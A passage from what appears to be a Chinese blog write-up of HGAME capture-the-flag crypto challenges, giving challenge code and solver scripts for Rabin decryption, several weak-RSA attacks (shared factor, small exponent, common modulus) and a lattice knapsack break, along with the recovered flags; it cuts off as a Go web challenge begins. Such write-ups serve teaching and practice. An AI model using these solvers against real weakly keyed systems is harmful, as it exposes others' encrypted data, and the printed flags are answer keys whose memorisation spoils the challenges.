class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">kbits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(kbits)</span><br><span class="line">        q = getPrime(kbits)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> q % <span class="number">4</span>== <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line">p ,q = gen_key(<span class="number">256</span>)</span><br><span class="line">   flag =  <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">   pt = bytes_to_long(flag)</span><br><span class="line">   c = <span class="built_in">pow</span>(pt, <span class="number">2</span>, p*q)</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">print</span>(<span class="string">f&quot;p=<span class="subst">&#123;p&#125;</span>\nq=<span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;<span class="built_in">hex</span>(c)[<span class="number">2</span>:]&#125;</span>&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p=65428327184555679690730137432886407240184329534772421373193521144693375074983</span></span><br><span class="line"><span class="string">q=98570810268705084987524975482323456006480531917292601799256241458681800554123</span></span><br><span class="line"><span class="string">   c=4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span></span><br><span class="line"><span class="string">   &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$e=2$，Rabin算法解RSA。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span><br><span class="line">n = p * q</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">yp = gmpy2.invert(p, q)</span><br><span class="line">yq = gmpy2.invert(q, p)</span><br><span class="line">r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">rr = n - r</span><br><span class="line">s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">ss = n - s</span><br><span class="line"><span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"> </span><br><span class="line">p = <span class="number">65428327184555679690730137432886407240184329534772421373193521144693375074983</span></span><br><span class="line">q = <span class="number">98570810268705084987524975482323456006480531917292601799256241458681800554123</span></span><br><span class="line">c = <span class="number">0x4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span></span><br><span class="line">m = rabin_decrypt(c,p,q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;That&#x27;5_s0_3asy_to_s@lve_r@bin&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="RSA-大冒险1"><a href="#RSA-大冒险1" class="headerlink" title="RSA 大冒险1"></a>RSA 大冒险1</h3><blockquote><p>马上要过年喽，兔兔开心地去超市买年货，但是超市门口却写着”只有完成挑战才能进入超市”，你能帮帮兔兔吗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge1.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall1_secret</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.p = getPrime(<span class="number">128</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">100</span>)</span><br><span class="line">        self.r = getPrime(<span class="number">100</span>)</span><br><span class="line">        self.m = chall1_secret</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q*self.r)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q*self.r, self.e, self.p</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge2.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall2_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.m = chall2_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_ ,self.e, self.p*self.q)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge3.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall3_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = <span class="number">3</span></span><br><span class="line">        self.m = chall3_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge4.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall4_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = getPrime(<span class="number">17</span>)</span><br><span class="line">        self.m = chall4_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q)</span><br><span class="line">        self.e = getPrime(<span class="number">17</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br></pre></td></tr></table></figure></blockquote><p>求解四层RSA拿flag。</p><p>第一层，$m&lt;p$，无需完全分解 $n$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">322341817140424854310546430443927118765748131714269745607168549026570389299661764844365062948036437</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">304198953434620851532952216290120837853</span></span><br><span class="line">c = <span class="number">0x22ca52bc2ed70d7133a0916529d73ed1e91f36f6d7d7118d40de0cdae89c692d637a28727a4b90077d</span></span><br><span class="line">d = inverse_mod(e,p-<span class="number">1</span>)</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c%p,d,p))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;m&lt;n_But_also_m&lt;p&#x27;</span></span><br></pre></td></tr></table></figure><p>第二层，$\gcd(n1,n2)=p$，交互两次数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">85985649208163776168434106703299680942043569819886697084537149593016735251489437349033723731635167019919946528408991797589149306964593269240843489773393816361050438737217630268220265477449408440087731905143882172966401806119978492409284761350964437389319354732032636067387214869765942537900408255046554977317</span></span><br><span class="line">c1 = <span class="number">0x75124a122559d227bb846448b401877c86e7ac67dc5a1329622a6b54bbae91d3bc5a9afb859d86d90ac24cdd76cc7fa0763be082d9aa9f0c487d44f7a0725d6f195d6168837468c505f92dd1da29b618e3de01292a9592a1b2ce3d4dcdc4cad202c3c1fe190bb2469cf401b1a2fef29b8e487db908f30085e262ef84e6501118</span></span><br><span class="line">n2 = <span class="number">59612565629569243187927748458601473421039478282275869456898180179757129074951912462324655640636883153553671190318605493897644967308094259008273993958933708638671942944003571666749098289527528628582925016986696150709641914606485011406578947680624107267500302631283661241951979431008098395802457051450378936263</span></span><br><span class="line">c2 = <span class="number">0x23db0d9129161ba5318a43bf18db2ac276faa8e6f75b9a48250dbbc04de5b6a67764f8f8917f3f11e4b7308d7563f262500abcc59f0dc44bdc20d438e9ad424dbf7b7187b6cab4eeb5b32fdeb800e8dd6afcea3f97d97bac3be5a5fe9fbb06717dbf43f68cf0f91754e4f89e9a606b21c1467d3b8a7a0ed10e40f3bfb1e81a6a</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = gcd(n1,n2)</span><br><span class="line">q1 = n1//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c1,d,n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;make_all_modulus_independent&#x27;</span></span><br></pre></td></tr></table></figure><p>第三层，$e=3$，$m^e \lt n$，小 $e$ 攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">62704397894391666479295080309251941192000653454396729807060395416391202444260383706554703418832720336900862424454646857290291688832249601582850489926515630514103107259941315796861595330414857499788329730467181727640390968106751789752583882632594974153970877867469382083206724358855594117005793286924964786309</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">0xfec61958cefda3eb5f709faa0282bffaded0a323fe1ef370e05ed3744a2e53b55bdd43e9594427c35514505f26e4691ba86c6dcff6d29d69110b15b9f84b0d8eb9ea7c03aaf24fa957314b89febf46a615f81ec031b12fe725f91af9d269873a69748</span></span><br><span class="line">m = gmpy2.iroot(c,e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;encrypt_exponent_should_be_bigger&#x27;</span></span><br></pre></td></tr></table></figure><p>第四层，共模攻击，交互两次数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line"><span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">g, y, x = egcd(b % a, a)</span><br><span class="line"><span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">n = <span class="number">95910070679089754882020609736361209978330742771232029437332648538529286081128112666433856280432204891053831926879516053786710256434719058164494668021689267490579582989448124586518700994273232858281123929454653035358779110102882528619796861827968986375140987711988221162025924201304147782787221328299013679367</span></span><br><span class="line">e1 = <span class="number">81919</span></span><br><span class="line">c1 = <span class="number">0x1d884ae280842f2c9f26fd4ec97d3e4d8d58cbe2ec0420f2179451663b873989d9dac3d796f6be72c982f82cd96dc346620c7028e48d0059acaa0242b36646c82e08a3e327ca0e2ee5f5cba574ad02953f3302963cd75760ea6bb5d8bc955b0b3d1c4f885d20cb8bb2d720331cba9fb0fb6a433e2b1f1ac588cf820be4169add</span></span><br><span class="line">e2 = <span class="number">108041</span></span><br><span class="line">c2 = <span class="number">0x69bd0266cd0c825ea1ac562385bb42be7040e1002e31f73c4139127577aa1d9d2a5cc05236bf03afb126202609e9fecc717bd229145bc7c5972a05476a8b66b8be1740f4f468ac24e9d8ed3ed5836a537aed77ad910bbb185a0421ed9faf97776e128058563ef0520e9fdf6ad47408da86ed02ab46761b962f8f34750c3791e1</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">s1 = - s1</span><br><span class="line">c1 = gp.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">s2 = - s2</span><br><span class="line">c2 = gp.invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;never_uese_same_modulus&#x27;</span></span><br></pre></td></tr></table></figure><p>四次提交正确得flag：<code>hgame&#123;W0w_you^knowT^e_CoMm0n_&amp;t$ack_@bout|RSA&#125;</code>。</p><p>​    </p><h3 id="包里有什么"><a href="#包里有什么" class="headerlink" title="包里有什么"></a>包里有什么</h3><blockquote><p>兔兔收到了一包年货，但是他忘了里面有什么了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> gcd, s2n</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">plain = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">&#x27;hgame&#123;&#x27;</span> + plain + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">v = <span class="built_in">bin</span>(s2n(plain))[<span class="number">2</span>:]</span><br><span class="line">l = <span class="built_in">len</span>(v)</span><br><span class="line">a = [<span class="number">2</span> &lt;&lt; i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">m = randint(<span class="built_in">sum</span>(a), <span class="number">2</span> &lt;&lt; l + <span class="number">1</span>)</span><br><span class="line">w = randint(<span class="number">0</span>, m)</span><br><span class="line"><span class="keyword">assert</span> gcd(w, m) == <span class="number">1</span></span><br><span class="line">b = [w * i % m <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line"></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    c += b[i] * <span class="built_in">int</span>(v[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;m = <span class="subst">&#123;m&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b0 = <span class="subst">&#123;b[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 1528637222531038332958694965114330415773896571891017629493424</span></span><br><span class="line"><span class="comment"># b0 = 69356606533325456520968776034730214585110536932989313137926</span></span><br><span class="line"><span class="comment"># c = 93602062133487361151420753057739397161734651609786598765462162</span></span><br></pre></td></tr></table></figure></blockquote><p>先利用 $b_0$ 求 $w$，再解背包密码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="number">1528637222531038332958694965114330415773896571891017629493424</span></span><br><span class="line">b0 = <span class="number">69356606533325456520968776034730214585110536932989313137926</span></span><br><span class="line">c = <span class="number">93602062133487361151420753057739397161734651609786598765462162</span></span><br><span class="line"></span><br><span class="line">w = b0//<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预估长度</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    l = m.nbits() - k</span><br><span class="line">    a = [<span class="number">2</span> &lt;&lt; i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">    b = [w * i % m <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line">    </span><br><span class="line">    pk =  b</span><br><span class="line">    ct =  c</span><br><span class="line">    n = <span class="built_in">len</span>(pk)</span><br><span class="line"></span><br><span class="line">    M = Matrix.identity(n) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    last_row = [<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> pk]</span><br><span class="line">    M_last_row = Matrix(ZZ, <span class="number">1</span>, <span class="built_in">len</span>(last_row), last_row)</span><br><span class="line"></span><br><span class="line">    last_col = pk</span><br><span class="line">    last_col.append(ct)</span><br><span class="line">    M_last_col = Matrix(ZZ, <span class="built_in">len</span>(last_col), <span class="number">1</span>, last_col)</span><br><span class="line"></span><br><span class="line">    M = M.stack(M_last_row)</span><br><span class="line">    M = M.augment(M_last_col)</span><br><span class="line"></span><br><span class="line">    X = M.BKZ()</span><br><span class="line"></span><br><span class="line">    sol = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>):</span><br><span class="line">        testrow = X.row(i).<span class="built_in">list</span>()[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">set</span>(testrow).issubset([-<span class="number">1</span>, <span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">for</span> v <span class="keyword">in</span> testrow:</span><br><span class="line">                <span class="keyword">if</span> v == <span class="number">1</span>:</span><br><span class="line">                    sol.append(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">elif</span> v == -<span class="number">1</span>:</span><br><span class="line">                    sol.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    s = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,sol)),<span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;:/b2\x83.F\x832z2\x1a\x82v&#123;\x1a\x82Z2G&quot;\x82Z/\x03&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;b\xe8N\xe6\xbeh\xdc\xbef\xc2\xe6\xf2\xbe\xc4\xc2r\xbe\xd2\xe6\xdcn\xbe\xd2\xe8~&#x27;</span></span><br><span class="line"><span class="comment"># b&quot;1t&#x27;s_4n_3asy_ba9_isn7_it?&quot;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="零元购年货商店"><a href="#零元购年货商店" class="headerlink" title="零元购年货商店"></a>零元购年货商店</h3><blockquote><p>听说兔兔要买年货，正好提瓦特大陆的璃月海灯节也要到了，tr0uble特地为兔兔准备了一份flag大礼。嗯，你也想要？不可以哦。</p></blockquote><p><code>router/router.go</code> 里主要逻辑：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loginController</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">_, err := 